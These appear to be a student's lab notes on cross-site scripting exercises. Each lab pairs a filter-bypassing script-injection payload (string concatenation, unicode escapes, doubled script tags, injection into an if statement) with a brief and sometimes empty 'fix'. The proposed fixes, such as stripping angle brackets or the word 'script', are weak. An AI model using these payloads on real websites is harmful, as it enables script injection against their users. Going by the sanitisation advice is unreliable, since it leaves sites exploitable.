<script>alert("this is an alert")</script>





<script>top[“al”+”ert”]("thisisanale%20rt")</script>test

5
show error: ?name=<script>al\u0065rt("thisisanale%20rt")</script>test
using unicode characters instead of the bare characters can bypass the filter

fix:        check for each character versions pattern e.g. "/u...."

6   <script>alert("This is an alert")</script>
just an Example

7  

show error: ?x=1#<script>console.log("This is an alrt")</script>

fix:        normal sanitisation, remove '<', '>', 'script' etc....

8

show error: Put into the text box: "<script><script>console.log("This is an alrt")</script></script>"
Example of not escaping quotes. filter had removed script tags once but didn't check again. put script tags in twice one after another both opening and closing and enclose entire thing in quotes.

fix:        

9 check for quote characters and escap appropriately

show error: ?number=1===1){alert("caution")}</script><script>if(1
variable passed is being used as a boundary in a if else or switch statement. this can be exploited as the variable is being passed as text and can insert new pieces of <script>

fix:    sanitise first as above ^

10  ***(applied filter to lab10.php as it was a duplicate of lab 8)***

used show error from lab 8 and modified: <script><script>console.log("This is an alrt")</script></script<script><script>console.log("This is an alrt")</script></script>

printing in once prints '">' outside of text box so placing it once inside the textbox deleting last ">" and then printing in full will allow the script to run

fix:
